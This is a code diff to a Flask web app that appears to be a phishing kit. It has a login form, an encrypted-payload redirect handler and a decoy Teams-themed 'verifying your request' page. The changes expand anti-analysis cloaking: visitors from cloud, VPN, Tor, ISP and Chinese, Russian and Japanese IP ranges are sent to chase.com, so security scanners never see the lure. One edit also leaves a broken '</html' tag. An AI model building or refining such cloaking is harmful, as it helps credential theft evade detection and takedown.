@@ -26,7 +26,6 @@ from dotenv import load_dotenv
 import ipaddress
 import string
 import sys
-import geoip2.database
 
 app = Flask(__name__)
 load_dotenv()
@@ -66,7 +65,11 @@ LINODE_CIDR_URL = "https://www.linode.com/docs/guides/networking/ip-ranges/"
 VULTR_CIDR_URL = "https://www.vultr.com/company/ip-ranges/"
 TOR_EXIT_URL = "https://check.torproject.org/torbulkexitlist"
 VPN_CIDR_URL = "https://raw.githubusercontent.com/X4BNet/lists_vpn/main/output/vpn/ipv4.txt"
-GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "/data/GeoLite2-City.mmdb")
+LUMEN_CIDR_URL = "https://raw.githubusercontent.com/SecOps-Institute/Level3-IPs/master/level3.netset"
+DATACAMP_CIDR_URL = "https://www.datacamp.com/network"  # Placeholder, may need RIPE lookup
+CHINA_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_cn.netset"
+RUSSIA_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_ru.netset"
+JAPAN_CIDR_URL = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/cidr_jp.netset"
 
 # Anti-bot settings
 SUSPICIOUS_UA_PATTERNS = [
@@ -115,14 +118,6 @@ try:
 except Exception as e:
     logger.error(f"Invalid HMAC key at startup: {str(e)}")
     raise ValueError(f"HMAC key initialization failed: {str(e)}")
-
-# Geo-IP setup
-try:
-    geoip_reader = geoip2.database.Reader(GEOIP_DB_PATH)
-    logger.debug("Geo-IP database initialized successfully")
-except Exception as e:
-    logger.error(f"Geo-IP database initialization failed: {str(e)}")
-    geoip_reader = None
 
 # Flask configuration
 try:
@@ -218,7 +213,7 @@ app.jinja_env.filters['datetime'] = datetime_filter
 def fetch_blocked_cidrs():
     blocked_cidrs = []
     try:
-        # Fetch AWS CIDRs
+        # Fetch AWS CIDRs (Amazon, Amazon Technologies Inc.)
         try:
             aws_response = requests.get(AWS_CIDR_URL, timeout=5)
             aws_response.raise_for_status()
@@ -230,7 +225,7 @@ def fetch_blocked_cidrs():
         except Exception as e:
             logger.warning(f"Failed to fetch AWS CIDRs: {str(e)}")
 
-        # Fetch Azure CIDRs
+        # Fetch Azure CIDRs (Microsoft, Microsoft Corporation)
         try:
             azure_response = requests.get(AZURE_CIDR_URL, timeout=5)
             azure_response.raise_for_status()
@@ -263,8 +258,29 @@ def fetch_blocked_cidrs():
         except Exception as e:
             logger.warning(f"Failed to fetch Google Cloud CIDRs: {str(e)}")
 
-        # Fetch DigitalOcean, Hetzner, Linode, Vultr, VPN
-        for url in [DIGITALOCEAN_CIDR_URL, HETZNER_CIDR_URL, LINODE_CIDR_URL, VULTR_CIDR_URL, VPN_CIDR_URL]:
+        # Fetch DigitalOcean, Hetzner, Linode, Vultr, VPN, Lumen, Datacamp
+        for url in [DIGITALOCEAN_CIDR_URL, HETZNER_CIDR_URL, LINODE_CIDR_URL, VULTR_CIDR_URL, VPN_CIDR_URL, LUMEN_CIDR_URL]:
+            try:
+                response = requests.get(url, timeout=5)
+                response.raise_for_status()
+                for line in response.text.splitlines():
+                    if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$|^[0-9a-f:]+/\d+$', line):
+                        blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
+            except Exception as e:
+                logger.warning(f"Failed to fetch CIDRs from {url}: {str(e)}")
+
+        # Fetch Datacamp CIDRs (placeholder, may need RIPE lookup)
+        try:
+            datacamp_response = requests.get(DATACAMP_CIDR_URL, timeout=5)
+            datacamp_response.raise_for_status()
+            for line in datacamp_response.text.splitlines():
+                if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', line):
+                    blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
+        except Exception as e:
+            logger.warning(f"Failed to fetch Datacamp CIDRs: {str(e)}")
+
+        # Fetch China, Russia, Japan CIDRs
+        for url in [CHINA_CIDR_URL, RUSSIA_CIDR_URL, JAPAN_CIDR_URL]:
             try:
                 response = requests.get(url, timeout=5)
                 response.raise_for_status()
@@ -364,7 +380,7 @@ def is_suspicious_request():
     try:
         ip_addr = ipaddress.ip_address(ip)
         if any(ip_addr in cidr for cidr in blocked_cidrs):
-            logger.debug(f"IP {ip} in blocked CIDR (cloud/VPN/Tor)")
+            logger.debug(f"IP {ip} in blocked CIDR (cloud/VPN/Tor/ISP/country)")
             return redirect("https://www.chase.com", code=302)
     except ValueError:
         logger.warning(f"Invalid IP address: {ip}")
@@ -424,23 +440,6 @@ def is_suspicious_request():
         if valkey_client.scard(fingerprint_key) > 5:
             risk_score += 50
             logger.debug(f"Repeated fingerprint from IP: {ip}")
-
-    # Geo-IP
-    if geoip_reader and valkey_client:
-        cached_geo = valkey_client.get(f"geoip:{ip}")
-        if cached_geo is None:
-            try:
-                response = geoip_reader.city(ip)
-                country_code = response.country.iso_code
-                valkey_client.setex(f"geoip:{ip}", 3600, country_code)
-            except Exception as e:
-                logger.warning(f"Geo-IP check failed for {ip}: {str(e)}")
-                country_code = None
-        else:
-            country_code = cached_geo
-        if country_code and country_code not in ['US']:  # Adjust target region
-            risk_score += 20
-            logger.debug(f"Unexpected Geo-IP for {ip}: {country_code}")
 
     # Store risk score
     if valkey_client:
@@ -659,7 +658,7 @@ def login():
                     </form>
                 </div>
             </body>
-            </html>
+            </html
         """, form=form)
     except Exception as e:
         logger.error(f"Error in login: {str(e)}", exc_info=True)
@@ -1134,7 +1133,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full text-center">
                     <h3 class="text-xl font-bold mb-4 text-gray-900">New security features in teams</h3>
                     <p class="text-gray-600 mb-4">Verifying your request... Please wait.</p>
-                    <p class="text-gray-600 text-sm">Enable cookies or disable VPN to proceed.</p>
+                    <p class="text-gray-600 text-sm">Enable cookies to proceed.</p>
                     <a href="/bot-trap/{{ bot_trap_token }}" style="display:none">trap</a>
                 </div>
             </body>
